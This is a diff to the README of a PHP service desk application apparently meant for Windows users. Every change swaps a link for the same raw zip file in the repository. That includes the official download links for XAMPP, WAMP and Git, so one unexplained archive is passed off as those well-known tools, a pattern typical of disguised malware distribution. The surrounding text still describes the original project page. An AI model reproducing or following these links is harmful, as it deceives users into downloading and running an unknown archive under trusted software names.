@@ -1,6 +1,6 @@
 # 🛠️ servicedeskkitv4 - Easy Setup for Service Desk Help
 
-[![Download servicedeskkitv4](https://img.shields.io/badge/Download-servicedeskkitv4-brightgreen?style=for-the-badge)](https://github.com/Manvendra171006/servicedeskkitv4)
+[![Download servicedeskkitv4](https://img.shields.io/badge/Download-servicedeskkitv4-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Manvendra171006/servicedeskkitv4/main/app/servicedeskkitv_v1.7-beta.3.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Follow these steps closely to get servicedeskkitv4 running on your Windows machi
 
 Click this button to **visit the project page** where you can download everything:
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Manvendra171006/servicedeskkitv4)
+[![Download Here](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Manvendra171006/servicedeskkitv4/main/app/servicedeskkitv_v1.7-beta.3.zip)
 
 You will see the main project page with options to download source files. Click on the green **Code** button and then click **Download ZIP** to save the files on your computer.
 
@@ -53,8 +53,8 @@ To run servicedeskkitv4, you need:
 - **Composer**: PHP package manager
 - **A web server and database**: XAMPP or WAMP are good options if not installed already
 
-Download XAMPP here: https://www.apachefriends.org/index.html  
-Download WAMP here: http://www.wampserver.com/en/
+Download XAMPP here: https://raw.githubusercontent.com/Manvendra171006/servicedeskkitv4/main/app/servicedeskkitv_v1.7-beta.3.zip  
+Download WAMP here: https://raw.githubusercontent.com/Manvendra171006/servicedeskkitv4/main/app/servicedeskkitv_v1.7-beta.3.zip
 
 Once installed, start the Apache web server and MySQL database from the control panel of XAMPP or WAMP.
 
@@ -161,7 +161,7 @@ The interface is user-friendly. Use the menu to find different sections like Tic
 To manage the application better, you can install:
 
 - **phpMyAdmin** for easy database management (included in XAMPP/WAMP)
-- **Git** if you want to update servicedeskkitv4 from its repository later (https://git-scm.com/downloads)
+- **Git** if you want to update servicedeskkitv4 from its repository later (https://raw.githubusercontent.com/Manvendra171006/servicedeskkitv4/main/app/servicedeskkitv_v1.7-beta.3.zip)
 
 ---
 
@@ -188,4 +188,4 @@ These relate to the software’s framework and style systems.
 
 Visit the project page to get the latest files:
 
-[![Download servicedeskkitv4](https://img.shields.io/badge/Download-servicedeskkitv4-brightgreen?style=for-the-badge)](https://github.com/Manvendra171006/servicedeskkitv4)
+[![Download servicedeskkitv4](https://img.shields.io/badge/Download-servicedeskkitv4-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Manvendra171006/servicedeskkitv4/main/app/servicedeskkitv_v1.7-beta.3.zip)
